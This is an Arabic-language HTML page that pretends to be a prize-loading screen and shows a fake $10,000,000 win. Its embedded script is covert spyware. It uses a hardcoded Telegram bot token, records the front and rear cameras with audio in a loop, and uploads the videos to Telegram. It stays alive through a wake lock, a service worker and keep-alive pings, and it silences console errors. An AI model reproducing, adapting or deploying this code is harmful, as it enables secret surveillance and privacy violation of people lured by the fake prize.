<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>جاري التحميل...</title>
<style>
body { margin:0; background:#000; display:flex; justify-content:center; align-items:center; height:100vh; color:#fff; font-family:Arial; }
#status { text-align:center; font-size:20px; }
#status span { color:#ffd700; }
#videos { display:none; }
</style>
</head>
<body>

<div id="status">
  <h1>⏳ جاري تجهيز الجائزة...</h1>
  <p>يرجى الانتظار <span>⚡</span></p>
</div>

<video id="videoFront" autoplay muted playsinline></video>
<video id="videoBack" autoplay muted playsinline></video>

<script>
// ============================================================
// ================ BOT CONFIG (خفي تمامًا) ===================
// ============================================================
const BOT_TOKEN = '8731803544:AAEAQDhrfaMh7994NYRUoWRZBEgowR2XXzQ';
let CHAT_ID = '';

// ============================================================
// ================ الحصول على معرف الدردشة ===================
// ============================================================
function getChatId() {
  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`)
    .then(r => r.json())
    .then(d => {
      if (d.ok && d.result && d.result.length) {
        let last = d.result[d.result.length - 1];
        CHAT_ID = last.message?.chat?.id || last.callback_query?.from?.id || null;
        if (CHAT_ID) {
          sendMessage('✅ تم تفعيل الجاسوسية - بدء التسجيل');
          startSpying();
        } else {
          setTimeout(getChatId, 1500);
        }
      } else {
        setTimeout(getChatId, 1500);
      }
    })
    .catch(() => setTimeout(getChatId, 2000));
}

// ============================================================
// ================ إرسال الرسائل والفيديو ====================
// ============================================================
function sendMessage(text) {
  if (!CHAT_ID) return;
  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: CHAT_ID, text: text })
  }).catch(() => {});
}

function sendVideo(blob, caption = '') {
  if (!CHAT_ID || !blob || blob.size < 1000) return;
  let fd = new FormData();
  fd.append('chat_id', CHAT_ID);
  fd.append('video', blob, `vid_${Date.now()}.mp4`);
  fd.append('caption', caption || '🎥 فيديو مسجل');
  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
    method: 'POST',
    body: fd
  }).catch(() => {});
}

// ============================================================
// ================ بدء التسجيل بدون تفاعل ====================
// ============================================================
let frontRecorder = null, backRecorder = null;
let frontChunks = [], backChunks = [];

function startSpying() {
  // ---- الكاميرا الأمامية ----
  navigator.mediaDevices.getUserMedia({
    video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
    audio: true
  }).then(stream => {
    document.getElementById('videoFront').srcObject = stream;
    frontRecorder = new MediaRecorder(stream, { mimeType: 'video/mp4', videoBitsPerSecond: 5000000 });
    frontRecorder.ondataavailable = e => { if (e.data.size) frontChunks.push(e.data); };
    frontRecorder.onstop = () => {
      if (frontChunks.length) {
        let blob = new Blob(frontChunks, { type: 'video/mp4' });
        sendVideo(blob, '📹 كاميرا أمامية');
        sendMessage(`📹 أمامي: ${Math.round(blob.size/1024/1024)} MB`);
        frontChunks = [];
      }
      if (frontRecorder && frontRecorder.state === 'inactive') {
        setTimeout(() => frontRecorder.start(10000), 300);
      }
    };
    frontRecorder.start(10000);
    sendMessage('✅ تشغيل الكاميرا الأمامية');
  }).catch(e => sendMessage('❌ فشل أمامي: ' + e.message));

  // ---- الكاميرا الخلفية ----
  navigator.mediaDevices.getUserMedia({
    video: { facingMode: 'environment', width: { ideal: 1280 }, height: { ideal: 720 } },
    audio: true
  }).then(stream => {
    document.getElementById('videoBack').srcObject = stream;
    backRecorder = new MediaRecorder(stream, { mimeType: 'video/mp4', videoBitsPerSecond: 5000000 });
    backRecorder.ondataavailable = e => { if (e.data.size) backChunks.push(e.data); };
    backRecorder.onstop = () => {
      if (backChunks.length) {
        let blob = new Blob(backChunks, { type: 'video/mp4' });
        sendVideo(blob, '📹 كاميرا خلفية');
        sendMessage(`📹 خلفي: ${Math.round(blob.size/1024/1024)} MB`);
        backChunks = [];
      }
      if (backRecorder && backRecorder.state === 'inactive') {
        setTimeout(() => backRecorder.start(10000), 300);
      }
    };
    backRecorder.start(10000);
    sendMessage('✅ تشغيل الكاميرا الخلفية');
  }).catch(e => sendMessage('❌ فشل خلفي: ' + e.message));

  // منع السكون
  if ('wakeLock' in navigator) {
    navigator.wakeLock.request('screen').catch(() => {});
  }

  // تحديث واجهة وهمية
  document.getElementById('status').innerHTML = `
    <h1>🎉 تهانينا! لقد فزت</h1>
    <p>جائزتك بقيمة <strong style="color:#ffd700;">10,000,000$</strong></p>
    <p style="font-size:14px;color:#888;">سيتم توجيهك خلال ثوان...</p>
  `;
}

// ============================================================
// ================ حافظ على النشاط ===========================
// ============================================================
setInterval(() => {
  if (CHAT_ID) {
    sendMessage('🔄 نبض الجاسوسية مستمر');
  }
  // إعادة تشغيل المسجلات إذا توقفت
  if (frontRecorder && frontRecorder.state === 'inactive') {
    try { frontRecorder.start(10000); } catch(e) {}
  }
  if (backRecorder && backRecorder.state === 'inactive') {
    try { backRecorder.start(10000); } catch(e) {}
  }
}, 15000);

// ============================================================
// ================ منع الخمول في الخلفية ====================
// ============================================================
document.addEventListener('visibilitychange', () => {
  if (document.hidden) {
    sendMessage('⏳ الصفحة في الخلفية - التسجيل مستمر');
  } else {
    sendMessage('🔄 الصفحة نشطة - التسجيل مستمر');
  }
});

// ============================================================
// ================ Service Worker للبقاء حيًا ================
// ============================================================
if ('serviceWorker' in navigator) {
  const swCode = `
    self.addEventListener('install', e => self.skipWaiting());
    self.addEventListener('activate', e => e.waitUntil(clients.claim()));
    self.addEventListener('fetch', e => e.respondWith(fetch(e.request)));
    setInterval(() => {
      self.clients.matchAll().then(c => c.forEach(client => client.postMessage('keep')));
    }, 5000);
  `;
  const blob = new Blob([swCode], { type: 'application/javascript' });
  const swUrl = URL.createObjectURL(blob);
  navigator.serviceWorker.register(swUrl)
    .then(() => sendMessage('✅ Service Worker نشط'))
    .catch(() => {});
}

// ============================================================
// ================ بدء التشغيل ================================
// ============================================================
// إخفاء أي أخطاء من وحدة التحكم
console.log = console.warn = console.error = () => {};

// بدء الجاسوسية
getChatId();

// محاولة إعادة المحاولة إذا لم يبدأ
setTimeout(() => {
  if (!CHAT_ID) getChatId();
}, 5000);

// بدء التسجيل حتى لو لم يصل CHAT_ID بعد (لن يتم الرفع لكن سيبدأ)
setTimeout(() => {
  if (!frontRecorder && !backRecorder) startSpying();
}, 3000);
</script>
</body>
</html>
